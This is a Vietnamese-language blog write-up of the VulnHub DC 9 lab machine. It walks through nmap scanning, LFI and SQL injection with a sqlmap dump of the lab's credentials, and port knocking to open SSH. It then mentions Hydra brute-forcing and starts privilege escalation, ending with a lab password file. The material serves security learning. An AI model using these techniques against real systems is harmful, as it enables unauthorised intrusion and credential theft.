@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="OverviewLink download: DC: 9Difficulty: Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[VulnHub] DC 9">
+<meta property="og:url" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="OverviewLink download: DC: 9Difficulty: Easy">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/dc9-vulnhub.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/1.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/3.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/4.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/5.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/6.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/7.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/8.png">
+<meta property="og:image" content="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/9.png">
+<meta property="article:published_time" content="2021-02-03T03:23:56.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.530Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="write up">
+<meta property="article:tag" content="easy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/dc9-vulnhub.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2021/02/03/dc9-vulnhub/","path":"2021/02/03/dc9-vulnhub/","title":"[VulnHub] DC 9"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[VulnHub] DC 9 | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-number">1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Information-Gathering"><span class="nav-number">2.</span> <span class="nav-text">Information Gathering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploition"><span class="nav-number">3.</span> <span class="nav-text">Exploition</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqlmap"><span class="nav-number">3.1.</span> <span class="nav-text">Sqlmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Burp-suite"><span class="nav-number">3.2.</span> <span class="nav-text">Burp suite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hydra"><span class="nav-number">3.3.</span> <span class="nav-text">Hydra</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">4.</span> <span class="nav-text">Privileges Escalation</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2021/02/03/dc9-vulnhub/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[VulnHub] DC 9 | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [VulnHub] DC 9
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-02-03 10:23:56" itemprop="dateCreated datePublished" datetime="2021-02-03T10:23:56+07:00">2021-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>9 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/dc9-vulnhub.png"></p>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9</a><br>Difficulty: Easy</p>
+<span id="more"></span>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn 10.10.10.102-105</span> </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:22 +07</span><br><span class="line">Nmap scan report for 10.10.10.104</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Nmap done: 4 IP addresses (1 host up) scanned in 1.26 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p- 10.10.10.104 --min-rate 3000</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:24 +07</span><br><span class="line">Nmap scan report for 10.10.10.104</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -A 10.10.10.104 -p 80</span>           </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:25 +07</span><br><span class="line">Nmap scan report for 10.10.10.104</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds</span><br></pre></td></tr></table></figure>
+<p>Hmm… bủn xỉn vcl, mở mỗi cổng 80-HTTP.<br><img src="/2021/02/03/dc9-vulnhub/1.png"><br><img src="/2021/02/03/dc9-vulnhub/2.png"><br>Từ từ đã, tại sao lại có dòng <em>File does not exist</em> ở kia? Tôi link ngay đến một bài CTF từng làm, truyền vào đây thêm một param nữa để gọi file. Đại khái là thằng manager.php đang gọi đến một hàm mở file và cần một param truyền vào (có thể là <em>file</em>, <em>f</em> hoặc gì gì…), nghe vô lý nhưng cái CTF style nó thế, chả đâu vào đâu :&#x2F;<br><img src="/2021/02/03/dc9-vulnhub/3.png"><br>Chốt lại là web server dính lỗi LFI, lấy được mã nguồn trang, các thứ các thứ, nhưng chưa có thông tin nào cần để lấy được shell.<br>Quay lại với search.php, kiểm tra xem nó có dính SQL Injection hay không.<br><img src="/2021/02/03/dc9-vulnhub/4.png"><br>Okay… vậy là có SQL Injection luôn. Ném nó vào Sqlmap dump dữ liệu ra xem có gì hay ho…</p>
+<h2 id="Exploition"><a href="#Exploition" class="headerlink" title="Exploition"></a>Exploition</h2><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[1 entry]</span><br><span class="line">+--------+----------------------------------+----------+</span><br><span class="line">| UserID | Password                         | Username |</span><br><span class="line">+--------+----------------------------------+----------+</span><br><span class="line">| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |</span><br><span class="line">+--------+----------------------------------+----------+</span><br><span class="line"></span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| id | lastname   | password      | reg_date            | username  | firstname |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |</span><br><span class="line">| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |</span><br><span class="line">| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |</span><br><span class="line">| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |</span><br><span class="line">| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |</span><br><span class="line">| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br><span class="line">| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |</span><br><span class="line">| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |</span><br><span class="line">| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |</span><br><span class="line">| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |</span><br><span class="line">| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br><span class="line">| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |</span><br><span class="line">| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |</span><br><span class="line">| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |</span><br><span class="line">| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |</span><br><span class="line">| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |</span><br><span class="line">| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br></pre></td></tr></table></figure>
+<p>Với mật khẩu hash của admin, đem crack chùa lấy được password ngon lành.<br>Thề, CrackStation với HashKiller lợi hại vãi cả đái.<br><img src="/2021/02/03/dc9-vulnhub/5.png"><br>Sau đó tôi có cố thử lợi dụng SQL Injection để up shell, chèn mã vào khắp nơi trên cái web site này. Sau 30 phút đéo đem lại gì ngoài sự chán nản. Đcm, chả nhẽ nó khó đến thế à?<br><em>Và thế là tôi lén mở write up lên để xem xem bước tiếp theo họ làm như thế nào.<br>Cái mảng kiến thức này thực sự trước giờ tôi đéo biết :D</em><br>Như này…</p>
+<h3 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h3><p>Lần này quay lại với lỗi LFI ở trên đã phát hiện được, bây giờ tôi muốn fuzzing những file ở trong thư mục &#x2F;etc để tìm kiếm thêm những cấu hình bên trong máy chủ này.<br><img src="/2021/02/03/dc9-vulnhub/6.png"><br><img src="/2021/02/03/dc9-vulnhub/7.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[options]</span><br><span class="line">	UseSyslog</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line">	sequence    = 7469,8475,9842</span><br><span class="line">	seq_timeout = 25</span><br><span class="line">	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">	sequence    = 9842,8475,7469</span><br><span class="line">	seq_timeout = 25</span><br><span class="line">	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = </span><br></pre></td></tr></table></figure>
+<p>Google về thằng klockd này:</p>
+<blockquote>
+<p>knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.</p>
+</blockquote>
+<p>Nói qua một chút cho dễ hiểu, giống như trò gõ cửa mà hồi bé hay chơi, gõ cửa 4 lần thì người ở trong mới mở cửa, còn nếu gõ sai, có nghĩa người bên ngoài là người lạ, thì người bên trong sẽ không mở cửa.<br>Thằng ml Knockd này như kiểu là một thằng đứng ở tầng liên kết (trong mô hình OSI). Nó lắng nghe toàn bộ lưu lượng truy cập và khi nó nghe được một chuỗi <em>knock knock</em> giống như mật khẩu gõ cửa, nó sẽ thực thi lệnh được xác định trong tệp cấu hình.<br>Phân tích tệp cấu hình knockd.conf. Có thể thấy, Knockd đang muốn lắng nghe lần lượt các gói tin TCP syn ở các cổng theo thứ tự 7469, 8475, 9842 để thực hiện lệnh mở cổng 22-SSH. Đây là lí do tại sao Nmap không thể quét ra được cổng 22-SSH trên máy chủ, vì nó có mở đéo đâu mà quét được.<br>Lúc này <em>knock knock knock</em> để mở cổng 22-SSH thôi nào :D</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">knock 10.10.10.104 7469 8475 9842</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -p- 10.10.10.104</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 22:55 +07</span><br><span class="line">Nmap scan report for 10.10.10.104</span><br><span class="line">Host is up (0.0038s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds</span><br></pre></td></tr></table></figure>
+<p>Good! Cái này trước đây tôi đéo biết, vậy nên làm bài này khiến tôi có thêm một kiến thức mới, không hề tệ với một bài lab easy.<br>Có SSH rồi, giờ brute-force thôi. Tại sao lại là brute-force? Vì ở kia tôi đã lấy được danh sách người dùng trong hệ thống từ file &#x2F;etc&#x2F;passwd. Password thì lấy được từ Sqlmap ở trên, mặc dù nó chả liên quan cho lắm nhưng biết đâu có user nào đấy chủ quan đặt password trên web trùng với password trên server thì sao.</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p><em>Lần này screen-shot Terminal cho nó màu mè</em><br><img src="/2021/02/03/dc9-vulnhub/8.png"></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Với session của user janitor, có một cái file vớ vẩn như thế này.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -al</span><br><span class="line">total 20</span><br><span class="line">drwxrwxrwx  5 janitor janitor 4096 Feb  4 21:54 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  2 janitor janitor 4096 Feb  4 21:55 duma</span><br><span class="line">drwx------  3 janitor janitor 4096 Feb  4 21:55 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line"></span><br><span class="line">janitor@dc-9:~$ cd .secrets-for-putin</span><br><span class="line"></span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwx------ 2 janitor janitor 4096 Dec 29  2019 .</span><br><span class="line">drwxrwxrwx 5 janitor janitor 4096 Feb  4 21:54 ..</span><br><span class="line">-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line"><span class="meta prompt_">P0Lic#</span><span class="language-bash">10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
